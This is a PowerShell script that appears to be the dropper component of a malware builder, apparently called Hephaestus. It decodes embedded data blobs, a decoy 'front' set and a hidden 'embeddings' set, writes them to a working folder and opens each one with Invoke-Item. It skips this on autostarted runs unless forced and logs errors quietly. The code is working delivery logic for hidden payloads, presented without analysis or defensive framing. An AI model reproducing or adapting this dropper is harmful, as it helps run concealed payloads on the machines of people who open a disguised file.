. ./utils.ps1
. ./consts_body.ps1
. ./consts_embeddings.ps1


function EmbeddingName {
    param (
        [string]$name
    )
    $folder = Get-HephaestusFolder
    return Join-Path -Path $folder -ChildPath $name
}

function DoInternalEmbeddings {
    param (
        [array]$names, [array]$datas, $force, $name
    )

    $auto = Test-Autostart;
    if ($force -eq $false -and $auto -eq $true)
    {
        writedbg "Skipping function DoInternalEmbeddings ($name)"
        return
    }
    try 
    {
        for ($i = 0; $i -lt $names.Length; $i++) {
            $name = $names[$i]
            $data = $datas[$i]
            $file = EmbeddingName($name)
            CustomDecode -inContent $data -outFile $file
            Invoke-Item $file
        }
    }
    catch {
    writedbg "An error occurred (DoFront): $_"
    }
}


function DoFront {
    DoInternalEmbeddings -names $xfront_name -datas $xfront -force $server.frontForce -name "front"
}

function DoEmbeddings {
    DoInternalEmbeddings -names $xembeddings_name -datas $xembeddings -force $server.embeddingsForce -name "embeddings"
}

function do_embeddings {
    DoFront
    DoEmbeddings
}

do_embeddings